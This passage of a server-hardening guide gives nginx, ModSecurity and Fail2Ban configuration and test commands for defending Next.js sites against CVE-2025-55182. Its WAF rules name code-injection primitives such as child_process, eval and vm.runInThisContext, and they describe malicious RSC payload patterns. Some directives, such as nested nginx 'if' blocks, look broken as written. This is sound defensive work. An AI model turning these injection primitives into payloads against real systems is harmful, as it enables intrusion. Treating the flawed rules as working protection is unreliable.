               application/vnd.ms-fontobject image/svg+xml;
    
    ##
    # Rate Limiting Zones
    ##
    limit_req_zone $binary_remote_addr zone=general:10m rate=30r/s;
    limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
    limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
    limit_req_zone $binary_remote_addr zone=strict:10m rate=1r/s;
    
    # Connection limiting
    limit_conn_zone $binary_remote_addr zone=conn_limit:10m;
    limit_conn_zone $server_name zone=perserver:10m;
    
    # Rate limit status
    limit_req_status 429;
    limit_conn_status 429;
    
    ##
    # GeoIP (Optional but recommended)
    ##
    # Uncomment if you have GeoIP installed
    # geoip_country /usr/share/GeoIP/GeoIP.dat;
    # map $geoip_country_code $allowed_country {
    #     default no;
    #     US yes;
    #     CA yes;
    #     GB yes;
    #     # Add your allowed countries
    # }
    
    ##
    # Include ModSecurity
    ##
    modsecurity on;
    modsecurity_rules_file /etc/nginx/modsec/main.conf;
    
    ##
    # Virtual Host Configs
    ##
    include /etc/nginx/conf.d/*.conf;
    include /etc/nginx/sites-enabled/*;
}
```

### /etc/nginx/conf.d/your-app.conf

```nginx
# Upstream definitions
upstream nextjs_frontend {
    server 127.0.0.1:3000 max_fails=3 fail_timeout=30s;
    keepalive 32;
}

upstream nodejs_backend {
    server 127.0.0.1:4000 max_fails=3 fail_timeout=30s;
    keepalive 32;
}

# Redirect HTTP to HTTPS
server {
    listen 80;
    listen [::]:80;
    server_name yourdomain.com www.yourdomain.com;
    
    # Allow Let's Encrypt challenges
    location /.well-known/acme-challenge/ {
        root /var/www/certbot;
    }
    
    location / {
        return 301 https://$server_name$request_uri;
    }
}

# Main HTTPS Server
server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;
    server_name yourdomain.com www.yourdomain.com;
    
    # SSL Configuration
    ssl_certificate /etc/letsencrypt/live/yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem;
    ssl_trusted_certificate /etc/letsencrypt/live/yourdomain.com/chain.pem;
    
    # SSL Optimization
    ssl_stapling on;
    ssl_stapling_verify on;
    resolver 8.8.8.8 8.8.4.4 valid=300s;
    resolver_timeout 5s;
    
    # Security Headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self' https://yourdomain.com; frame-ancestors 'none';" always;
    
    # Connection limits
    limit_conn conn_limit 20;
    limit_conn perserver 1000;
    
    # General rate limiting
    limit_req zone=general burst=50 nodelay;
    
    # Logging với security format
    access_log /var/log/nginx/yourdomain_access.log security;
    error_log /var/log/nginx/yourdomain_error.log warn;
    
    # Root directory (for static files if needed)
    root /var/www/yourdomain;
    
    ##
    # CVE-2025-55182 Protection Rules
    ##
    
    # Block suspicious headers
    if ($http_next_action != "") {
        return 403 "Access Denied - Suspicious Header Detected";
    }
    
    if ($http_rsc_action_id != "") {
        return 403 "Access Denied - Suspicious Header Detected";
    }
    
    # Additional RSC header checks
    if ($http_x_nextjs_request_id != "") {
        set $suspicious_request 1;
    }
    
    if ($http_next_router_state_tree != "") {
        set $suspicious_request "${suspicious_request}1";
    }
    
    # Block if multiple suspicious headers detected
    if ($suspicious_request = "11") {
        return 403 "Access Denied - Multiple Suspicious Headers";
    }
    
    # Block suspicious multipart POSTs to root
    if ($request_method = POST) {
        set $block_post 0;
        
        # Check for multipart form data
        if ($content_type ~* "multipart/form-data") {
            set $block_post 1;
        }
        
        # Combined with suspicious headers
        if ($http_next_action != "") {
            set $block_post "${block_post}1";
        }
        
        # Block if conditions met
        if ($block_post = "11") {
            return 403 "Access Denied - Suspicious POST Request";
        }
    }
    
    # Block known malicious patterns in request body (requires body inspection module)
    # This is handled by ModSecurity below
    
    ##
    # Backend API Routes
    ##
    location /api/ {
        # Strict rate limiting for API
        limit_req zone=api burst=20 nodelay;
        
        # CORS headers (adjust as needed)
        add_header Access-Control-Allow-Origin "https://yourdomain.com" always;
        add_header Access-Control-Allow-Methods "GET, POST, PUT, DELETE, OPTIONS" always;
        add_header Access-Control-Allow-Headers "Authorization, Content-Type" always;
        add_header Access-Control-Allow-Credentials "true" always;
        
        # Handle preflight
        if ($request_method = OPTIONS) {
            return 204;
        }
        
        # Additional security for API
        if ($http_user_agent ~* (bot|crawler|spider|scraper)) {
            return 403;
        }
        
        # Proxy to backend
        proxy_pass http://nodejs_backend;
        proxy_http_version 1.1;
        
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header X-Forwarded-Host $host;
        proxy_set_header X-Forwarded-Port $server_port;
        
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        
        # Timeouts
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;
        
        # Buffer settings
        proxy_buffering on;
        proxy_buffer_size 4k;
        proxy_buffers 8 4k;
        proxy_busy_buffers_size 8k;
        
        # Don't pass suspicious headers to backend
        proxy_set_header Next-Action "";
        proxy_set_header Rsc-Action-Id "";
        
        # Disable caching for API
        proxy_cache_bypass $http_pragma $http_authorization;
        proxy_no_cache $http_pragma $http_authorization;
    }
    
    ##
    # Login endpoint - extra protection
    ##
    location /api/auth/login {
        limit_req zone=login burst=3 nodelay;
        
        # Force HTTPS
        if ($scheme != "https") {
            return 301 https://$server_name$request_uri;
        }
        
        proxy_pass http://nodejs_backend;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
    
    ##
    # Frontend (Next.js)
    ##
    location / {
        # Rate limiting
        limit_req zone=general burst=50 nodelay;
        
        # Block suspicious patterns
        if ($request_uri ~* (eval|union|select|insert|drop|delete|update|script)) {
            return 403;
        }
        
        # Proxy to Next.js
        proxy_pass http://nextjs_frontend;
        proxy_http_version 1.1;
        
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        
        # Cache bypass for dynamic content
        proxy_cache_bypass $http_upgrade;
        
        # Timeouts
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;
    }
    
    ##
    # Next.js Static Files
    ##
    location /_next/static/ {
        proxy_pass http://nextjs_frontend;
        proxy_cache_valid 200 365d;
        proxy_cache_revalidate on;
        proxy_cache_use_stale error timeout updating http_500 http_502 http_503 http_504;
        
        add_header Cache-Control "public, max-age=31536000, immutable";
        access_log off;
    }
    
    location /_next/image {
        proxy_pass http://nextjs_frontend;
        proxy_cache_valid 200 30d;
        add_header Cache-Control "public, max-age=2592000";
    }
    
    ##
    # Static Assets
    ##
    location ~* \.(jpg|jpeg|png|gif|ico|css|js|svg|woff|woff2|ttf|eot)$ {
        expires 30d;
        add_header Cache-Control "public, immutable";
        access_log off;
    }
    
    ##
    # Health Check Endpoint
    ##
    location /health {
        access_log off;
        return 200 "healthy\n";
        add_header Content-Type text/plain;
    }
    
    ##
    # Block access to sensitive files
    ##
    location ~ /\. {
        deny all;
        access_log off;
        log_not_found off;
    }
    
    location ~* /(\.git|\.env|\.DS_Store|Thumbs\.db) {
        deny all;
        access_log off;
        log_not_found off;
    }
}
```

---

## 2. ModSecurity Configuration

### /etc/nginx/modsec/main.conf

```nginx
# ModSecurity main configuration file
Include /etc/nginx/modsec/modsecurity.conf

# Load OWASP Core Rule Set
Include /etc/nginx/modsec/crs/crs-setup.conf
Include /etc/nginx/modsec/crs/rules/*.conf

# Custom CVE-2025-55182 rules
Include /etc/nginx/modsec/custom-cve-2025-55182.conf
```

### /etc/nginx/modsec/modsecurity.conf

```nginx
# Basic ModSecurity configuration
SecRuleEngine On
SecRequestBodyAccess On
SecResponseBodyAccess Off

# Request body limits
SecRequestBodyLimit 13107200
SecRequestBodyNoFilesLimit 131072
SecRequestBodyLimitAction Reject

# Response body limits  
SecResponseBodyLimit 524288
SecResponseBodyLimitAction ProcessPartial

# Temporary directory
SecTmpDir /tmp/
SecDataDir /tmp/

# Debug log
SecDebugLog /var/log/modsec_debug.log
SecDebugLogLevel 0

# Audit log
SecAuditEngine RelevantOnly
SecAuditLogRelevantStatus "^(?:5|4(?!04))"
SecAuditLogParts ABIJDEFHZ
SecAuditLogType Serial
SecAuditLog /var/log/modsec_audit.log

# Argument separator
SecArgumentSeparator &

# Cookie format
SecCookieFormat 0

# Unicode encoding
SecUnicodeMapFile unicode.mapping 20127

# Status code for blocking
SecDefaultAction "phase:1,log,auditlog,pass"
SecDefaultAction "phase:2,log,auditlog,pass"
```

### /etc/nginx/modsec/custom-cve-2025-55182.conf

```nginx
# Custom rules for CVE-2025-55182 Protection

# Rule ID range: 9000000-9000999

# Block Next-Action header
SecRule REQUEST_HEADERS:Next-Action "@rx ." \
    "id:9000001,\
    phase:1,\
    block,\
    status:403,\
    log,\
    msg:'CVE-2025-55182: Next-Action header detected',\
    logdata:'Header value: %{MATCHED_VAR}',\
    severity:CRITICAL,\
    tag:'CVE-2025-55182',\
    tag:'React2Shell',\
    chain"
    SecRule REQUEST_METHOD "@streq POST"

# Block RSC-Action-ID header
SecRule REQUEST_HEADERS:Rsc-Action-Id "@rx ." \
    "id:9000002,\
    phase:1,\
    block,\
    status:403,\
    log,\
    msg:'CVE-2025-55182: RSC-Action-Id header detected',\
    severity:CRITICAL,\
    tag:'CVE-2025-55182'"

# Block Next-Router-State-Tree with suspicious patterns
SecRule REQUEST_HEADERS:Next-Router-State-Tree "@rx __PAGE__|children" \
    "id:9000003,\
    phase:1,\
    block,\
    status:403,\
    log,\
    msg:'CVE-2025-55182: Suspicious Next-Router-State-Tree',\
    severity:CRITICAL,\
    tag:'CVE-2025-55182',\
    chain"
    SecRule REQUEST_METHOD "@streq POST"

# Block malicious RSC payload patterns in request body
SecRule REQUEST_BODY "@rx \[\"\$[0-9]+:[a-z]:[a-z]\"\]" \
    "id:9000004,\
    phase:2,\
    block,\
    status:403,\
    log,\
    msg:'CVE-2025-55182: Malicious RSC payload pattern detected',\
    logdata:'Pattern found in body',\
    severity:CRITICAL,\
    tag:'CVE-2025-55182',\
    tag:'RSC-Exploit'"

# Block dangerous JavaScript functions in payload
SecRule REQUEST_BODY "@rx (vm\.runInThisContext|child_process|fs\.writeFile|require\(|eval\()" \
    "id:9000005,\
    phase:2,\
    block,\
    status:403,\
    log,\
    msg:'CVE-2025-55182: Dangerous JavaScript function in payload',\
    logdata:'Function: %{MATCHED_VAR}',\
    severity:CRITICAL,\
    tag:'CVE-2025-55182',\
    tag:'Code-Injection'"

# Block multipart POST to root with Next.js headers
SecRule REQUEST_METHOD "@streq POST" \
    "id:9000006,\
    phase:1,\
    pass,\
    nolog,\
    setvar:'tx.is_post=1'"

SecRule REQUEST_HEADERS:Content-Type "@contains multipart/form-data" \
    "id:9000007,\
    phase:1,\
    pass,\
    nolog,\
    chain,\
    setvar:'tx.is_multipart=1'"
    SecRule TX:is_post "@eq 1"

SecRule REQUEST_HEADERS:X-Nextjs-Request-Id "@rx ." \
    "id:9000008,\
    phase:1,\
    block,\
    status:403,\
    log,\
    msg:'CVE-2025-55182: Suspicious multipart POST with Next.js headers',\
    severity:CRITICAL,\
    tag:'CVE-2025-55182',\
    chain"
    SecRule TX:is_multipart "@eq 1" \
        "chain"
        SecRule TX:is_post "@eq 1"

# Block known exploit user agents
SecRule REQUEST_HEADERS:User-Agent "@rx (Go-http-client|python-requests|curl|wget|Scanner)" \
    "id:9000009,\
    phase:1,\
    block,\
    status:403,\
    log,\
    msg:'CVE-2025-55182: Known exploit user agent',\
    logdata:'User-Agent: %{MATCHED_VAR}',\
    severity:WARNING,\
    tag:'CVE-2025-55182',\
    chain"
    SecRule REQUEST_HEADERS:Next-Action "@rx ."

# Rate limiting for suspected attack patterns
SecAction \
    "id:9000010,\
    phase:1,\
    nolog,\
    pass,\
    initcol:ip=%{REMOTE_ADDR},\
    setvar:ip.cve_attempts=+1,\
    deprecatevar:ip.cve_attempts=10/60,\
    expirevar:ip.cve_attempts=60"

SecRule IP:CVE_ATTEMPTS "@gt 5" \
    "id:9000011,\
    phase:1,\
    block,\
    status:429,\
    log,\
    msg:'CVE-2025-55182: Too many suspected attack attempts',\
    logdata:'Attempts: %{MATCHED_VAR}',\
    severity:WARNING,\
    tag:'CVE-2025-55182',\
    tag:'Rate-Limit'"

# Log all POST requests to root for monitoring
SecRule REQUEST_METHOD "@streq POST" \
    "id:9000012,\
    phase:1,\
    pass,\
    log,\
    msg:'POST request to application',\
    chain"
    SecRule REQUEST_URI "@streq /"

# Paranoia mode - block any request with React Server Components indicators
SecRule REQUEST_HEADERS "@rx (next-|rsc-|x-nextjs-)" \
    "id:9000099,\
    phase:1,\
    block,\
    status:403,\
    log,\
    msg:'CVE-2025-55182 PARANOID: Any RSC-related header blocked',\
    severity:CRITICAL,\
    tag:'CVE-2025-55182',\
    tag:'Paranoid-Mode',\
    ctl:ruleEngine=On"
```

---

## 3. Fail2Ban Configuration

### /etc/fail2ban/jail.local

```ini
[DEFAULT]
bantime = 3600
findtime = 600
maxretry = 3
destemail = admin@yourdomain.com
sender = fail2ban@yourdomain.com

[sshd]
enabled = true
port = ssh
logpath = /var/log/auth.log

[nginx-cve-2025-55182]
enabled = true
port = http,https
filter = nginx-cve-2025-55182
logpath = /var/log/nginx/*access.log
maxretry = 1
bantime = 86400
findtime = 60

[nginx-limit-req]
enabled = true
port = http,https
filter = nginx-limit-req
logpath = /var/log/nginx/*error.log
maxretry = 5
bantime = 3600

[nginx-bad-request]
enabled = true
port = http,https
filter = nginx-bad-request
logpath = /var/log/nginx/*access.log
maxretry = 10
bantime = 7200
```

### /etc/fail2ban/filter.d/nginx-cve-2025-55182.conf

```ini
[Definition]
failregex = ^<HOST> .* "(GET|POST|HEAD).*" .* ".*next-action.*"$
            ^<HOST> .* "(GET|POST|HEAD).*" .* ".*rsc-action.*"$
            ^<HOST> .* "POST.*multipart/form-data.*".*".*x-nextjs-request-id.*"$

ignoreregex =
```

---

## 4. Installation Commands

```bash
# Install ModSecurity
sudo apt update
sudo apt install -y nginx-extras libnginx-mod-security2

# Download OWASP Core Rule Set
cd /etc/nginx/modsec
sudo git clone https://github.com/coreruleset/coreruleset.git crs
cd crs
sudo cp crs-setup.conf.example crs-setup.conf

# Create custom rules directory
sudo mkdir -p /etc/nginx/modsec/custom

# Copy configurations (from files above)
sudo cp modsecurity.conf /etc/nginx/modsec/
sudo cp custom-cve-2025-55182.conf /etc/nginx/modsec/

# Set permissions
sudo chown -R www-data:www-data /etc/nginx/modsec
sudo chmod 644 /etc/nginx/modsec/*.conf

# Test Nginx configuration
sudo nginx -t

# Reload Nginx
sudo systemctl reload nginx

# Install Fail2Ban
sudo apt install -y fail2ban

# Copy Fail2Ban configs
sudo cp jail.local /etc/fail2ban/
sudo cp nginx-cve-2025-55182.conf /etc/fail2ban/filter.d/

# Restart Fail2Ban
sudo systemctl restart fail2ban

# Check status
sudo fail2ban-client status nginx-cve-2025-55182
```

---

## 5. Testing Configuration

```bash
# Test 1: Normal request (should work)
curl -I https://yourdomain.com/

# Test 2: Request with Next-Action header (should be blocked)
curl -I https://yourdomain.com/ -H "Next-Action: x"

# Test 3: Suspicious POST (should be blocked)
curl -X POST https://yourdomain.com/ \
  -H "Content-Type: multipart/form-data" \
  -H "Next-Action: x" \
  -H "X-Nextjs-Request-Id: test"

# Test 4: Check ModSecurity logs
sudo tail -f /var/log/modsec_audit.log

# Test 5: Check Fail2Ban
sudo fail2ban-client status
```

---

## 6. Monitoring Commands

```bash
# Watch for CVE-2025-55182 attempts in real-time
sudo tail -f /var/log/nginx/access.log | grep --color=always "next-action\|rsc-action"

# Check ModSecurity blocks
sudo grep "CVE-2025-55182" /var/log/modsec_audit.log | wc -l

# Check Fail2Ban bans
sudo fail2ban-client status nginx-cve-2025-55182

# Unban an IP (if needed)
sudo fail2ban-client set nginx-cve-2025-55182 unbanip <IP_ADDRESS>

# View banned IPs
sudo iptables -L -n | grep DROP
```

---

**Note:** Đảm bảo test thoroughly trong staging environment trước khi deploy lên production!
